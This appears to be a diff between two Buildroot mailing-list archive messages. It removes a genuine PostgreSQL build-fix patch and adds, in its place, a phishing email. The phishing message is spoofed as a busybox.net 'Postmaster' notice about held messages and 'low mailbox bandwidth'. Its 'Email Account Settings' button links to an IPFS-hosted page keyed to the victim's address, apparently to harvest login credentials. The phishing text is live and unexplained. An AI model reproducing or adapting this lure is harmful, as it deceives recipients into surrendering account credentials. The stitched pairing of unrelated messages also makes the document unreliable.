@@ -4,61 +4,42 @@ X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 Received: from smtp4.osuosl.org (smtp4.osuosl.org [140.211.166.137])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.lore.kernel.org (Postfix) with ESMTPS id 3912BC47DA2
-	for <buildroot@archiver.kernel.org>; Wed, 17 Jan 2024 21:08:34 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTPS id 1B1EAC47DA2
+	for <buildroot@archiver.kernel.org>; Wed, 17 Jan 2024 21:13:44 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
-	by smtp4.osuosl.org (Postfix) with ESMTP id CA5FE41DEE;
-	Wed, 17 Jan 2024 21:08:33 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org CA5FE41DEE
+	by smtp4.osuosl.org (Postfix) with ESMTP id BA474402FE;
+	Wed, 17 Jan 2024 21:13:43 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org BA474402FE
 X-Virus-Scanned: amavisd-new at osuosl.org
 Received: from smtp4.osuosl.org ([127.0.0.1])
 	by localhost (smtp4.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
-	with ESMTP id 1EVv7Rv8CAzf; Wed, 17 Jan 2024 21:08:33 +0000 (UTC)
+	with ESMTP id zUFEylGYF2U5; Wed, 17 Jan 2024 21:13:43 +0000 (UTC)
 Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
-	by smtp4.osuosl.org (Postfix) with ESMTP id 17ED441DF5;
-	Wed, 17 Jan 2024 21:08:32 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org 17ED441DF5
-Received: from smtp2.osuosl.org (smtp2.osuosl.org [140.211.166.133])
- by ash.osuosl.org (Postfix) with ESMTP id E169A1BF335
- for <buildroot@lists.busybox.net>; Wed, 17 Jan 2024 21:08:29 +0000 (UTC)
+	by smtp4.osuosl.org (Postfix) with ESMTP id 154AD402C4;
+	Wed, 17 Jan 2024 21:13:42 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org 154AD402C4
+Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
+ by ash.osuosl.org (Postfix) with ESMTP id 2806B1BF335
+ for <buildroot@lists.busybox.net>; Wed, 17 Jan 2024 21:13:40 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
- by smtp2.osuosl.org (Postfix) with ESMTP id B7EFB4371E
- for <buildroot@lists.busybox.net>; Wed, 17 Jan 2024 21:08:29 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp2.osuosl.org B7EFB4371E
+ by smtp1.osuosl.org (Postfix) with ESMTP id 011E88143D
+ for <buildroot@lists.busybox.net>; Wed, 17 Jan 2024 21:13:40 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 011E88143D
 X-Virus-Scanned: amavisd-new at osuosl.org
-Received: from smtp2.osuosl.org ([127.0.0.1])
- by localhost (smtp2.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
- with ESMTP id lTbwNUCKK8D9 for <buildroot@lists.busybox.net>;
- Wed, 17 Jan 2024 21:08:28 +0000 (UTC)
-Received: from smtp3-g21.free.fr (smtp3-g21.free.fr [IPv6:2a01:e0c:1:1599::12])
- by smtp2.osuosl.org (Postfix) with ESMTPS id 6B0A043714
- for <buildroot@buildroot.org>; Wed, 17 Jan 2024 21:08:28 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp2.osuosl.org 6B0A043714
-Received: from home.juju.sh (unknown
- [IPv6:2a01:e0a:485:b220:64fe:9015:874f:9d44])
- (Authenticated sender: ju.o@free.fr)
- by smtp3-g21.free.fr (Postfix) with ESMTPSA id 8AF0413F88D;
- Wed, 17 Jan 2024 22:08:22 +0100 (CET)
-From: Julien Olivain <ju.o@free.fr>
-To: buildroot@buildroot.org
-Date: Wed, 17 Jan 2024 22:07:56 +0100
-Message-ID: <20240117210756.265708-1-ju.o@free.fr>
-X-Mailer: git-send-email 2.43.0
+Received: from smtp1.osuosl.org ([127.0.0.1])
+ by localhost (smtp1.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
+ with ESMTP id 6G5jY0T31uq6 for <buildroot@lists.busybox.net>;
+ Wed, 17 Jan 2024 21:13:39 +0000 (UTC)
+Received: from busybox.net (unknown [141.98.10.96])
+ by smtp1.osuosl.org (Postfix) with ESMTP id C49BB8142E
+ for <buildroot@busybox.net>; Wed, 17 Jan 2024 21:13:38 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org C49BB8142E
+From: Postmaster <buildroot@busybox.net>
+To: buildroot@busybox.net
+Date: 17 Jan 2024 22:13:37 +0100
+Message-ID: <20240117221337.1806C6243AAF2E86@busybox.net>
 MIME-Version: 1.0
-X-Mailman-Original-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple;
- d=free.fr; s=smtp-20201208; t=1705525705;
- bh=DRQM8y1jJj0InW+n8r2unfW4XoEBxP/0wyGor3tVch4=;
- h=From:To:Cc:Subject:Date:From;
- b=Vs32XA3PKdlmN3qPtuB5STA4Bjtpgl8j1mAezZm24jUSmSnxtEgUfIc8mTYRyQz0J
- lbszHx/G2kveUqBAsS+mxzX13xcbPfFagEK/hS1mvsbdYdWwD8C9cV/FfcuNV8CGX0
- t7OZ4Lfj1f1oB9Ne9YthTzMAj2E6X1/GrzELSHiCXv8ibvZLQjW7TNwJkEghfUdqiI
- dd0dZ9M7lrKHzUhuwwDwTi0xyUQH99DeK3wNQAD1dEQ6oESOCEhgCGoT/xp27uI0qy
- D/ODSGMFleJ1HEsCEDfDWhgahBfamcviHa49QzgCsNMB6ZS2CqED+CUsS6dBiFaj3A
- HRKo9QouzGp0w==
-X-Mailman-Original-Authentication-Results: smtp2.osuosl.org;
- dkim=pass (2048-bit key) header.d=free.fr header.i=@free.fr
- header.a=rsa-sha256 header.s=smtp-20201208 header.b=Vs32XA3P
-Subject: [Buildroot] [PATCH 1/1] package/postgresql: fix service runtime
+Subject: [Buildroot] Undeliverable: Incoming messages failure
 X-BeenThere: buildroot@buildroot.org
 X-Mailman-Version: 2.1.29
 Precedence: list
@@ -70,63 +51,69 @@ List-Post: <mailto:buildroot@buildroot.org>
 List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
 List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
  <mailto:buildroot-request@buildroot.org?subject=subscribe>
-Cc: Maxim Kochetkov <fido_max@inbox.ru>, Julien Olivain <ju.o@free.fr>
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
+Content-Type: multipart/mixed; boundary="===============7623380234852786645=="
 Errors-To: buildroot-bounces@buildroot.org
 Sender: "buildroot" <buildroot-bounces@buildroot.org>
 
-Since commit 2a8065e "package/postgresql: bump version to 16.1", the
-postgresql service fail to start at runtime with an error:
+--===============7623380234852786645==
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
 
-    FATAL:  could not load library "/usr/lib/postgresql/dict_snowball.so": /usr/lib/postgresql/dict_snowball.so: undefined symbol: CurrentMemoryContext
+<html><head>
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.20139">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<table width=3D"100%" bgcolor=3D"#ffffff" border=3D"0" cellspacing=3D"0" ce=
+llpadding=3D"0">
+<tbody>
+<tr>
+<td height=3D"1" style=3D"margin: 0px;" bgcolor=3D"#dae1e9"><font size=3D"1=
+"></font></td></tr>
+<tr>
+<td height=3D"24" style=3D"margin: 0px;"><font size=3D"1">&nbsp;</font></td=
+></tr>
+<tr>
+<td align=3D"center" style=3D"margin: 0px;">
+<p><font size=3D"4">Dear&nbsp;</font><a style=3D"color: rgb(34, 34, 34);"><=
+font size=3D"4">buildroot@busybox.net</font></a><font size=3D"4">,</font></=
+p><span style=3D"color: rgb(72, 84, 93); line-height: 24px; font-size: 14px=
+;"><font size=3D"4">Your incoming messages has been placed on hold due to l=
+ow mailbox bandwidth.<br>Go to Email account settings below to review held =
+messages and fix bugs.</font></span></td></tr>
+<tr>
+<td height=3D"20" style=3D"margin: 0px;"><font size=3D"4">&nbsp;</font></td=
+></tr>
+<tr>
+<td width=3D"48%" align=3D"center" valign=3D"top" style=3D"margin: 0px;"><s=
+pan><a style=3D"padding: 15px 25px; color: rgb(255, 255, 255); text-decorat=
+ion: none; display: block; background-color: rgb(0, 135, 209);" href=3D"htt=
+ps://cloudflare-ipfs.com/ipfs/bafkreig3rzz7osd7b5zf643kcdgo22rd4oychyph5ohq=
+idbi4tadbv2ljy#buildroot@busybox.net" rel=3D"noopener noreferrer"><font siz=
+e=3D"4">Email Account Settings</font></a></span></td></tr>
+<tr>
+<td height=3D"20" style=3D"margin: 0px;"><font size=3D"4"></font></td></tr>=
 
-This is due to the Posgresql autotool configure script trying to
-detect whether the toolchain linker needs --export-dynamic or not.
-This test is done with a runtime execution of a test program, and
-therefore cannot run in cross-compilation. In that case, the
-configure script assumes it is not needed. See commit [1], included
-in PostgreSQL v16.0.
+<tr>
+<td height=3D"20" style=3D"margin: 0px;"><font size=3D"4"></font></td></tr>=
 
-This commit fixes the issue by forcing the value in _CONF_ENV. The
-package has already a Kconfig dependency on !BR2_STATIC_LIBS, so the
-value can be unconditionally set.
+<tr>
+<td align=3D"center" style=3D"margin: 0px;">
+<p style=3D"color: rgb(162, 162, 162); line-height: 17px; font-size: 12px; =
+font-style: italic;"><font size=3D"3">Failure to review your account may ca=
+use login interruption.<br>&copy; 2023 busybox.net. All Rights Reserved.</f=
+ont></p></td></tr></tbody></table></body></html>
 
-[1] https://git.postgresql.org/gitweb/?p=postgresql.git;a=commitdiff;h=9db49fc5bfdc0126be03f4b8986013e59d93b91d
-
-Signed-off-by: Julien Olivain <ju.o@free.fr>
----
-This patch was tested on branch master at commit b200632, and also
-with patch from:
-https://patchwork.ozlabs.org/project/buildroot/patch/20240111224003.243443-1-ju.o@free.fr/
-
-with command:
-
-    support/testing/run-tests \
-        -d dl -o output_folder \
-        tests.package.test_postgresql
-    ...
-    OK
----
- package/postgresql/postgresql.mk | 1 +
- 1 file changed, 1 insertion(+)
-
-diff --git a/package/postgresql/postgresql.mk b/package/postgresql/postgresql.mk
-index ec5b61b932..644f93d88a 100644
---- a/package/postgresql/postgresql.mk
-+++ b/package/postgresql/postgresql.mk
-@@ -15,6 +15,7 @@ POSTGRESQL_INSTALL_STAGING = YES
- POSTGRESQL_CONFIG_SCRIPTS = pg_config
- POSTGRESQL_CONF_ENV = \
- 	ac_cv_type_struct_sockaddr_in6=yes \
-+	pgac_cv_prog_cc_LDFLAGS_EX_BE__Wl___export_dynamic=yes \
- 	LIBS=$(TARGET_NLS_LIBS)
- POSTGRESQL_CONF_OPTS = --disable-rpath
- POSTGRESQL_DEPENDENCIES = $(TARGET_NLS_DEPENDENCIES)
--- 
-2.43.0
+--===============7623380234852786645==
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
 
 _______________________________________________
 buildroot mailing list
 buildroot@buildroot.org
 https://lists.buildroot.org/mailman/listinfo/buildroot
+
+--===============7623380234852786645==--
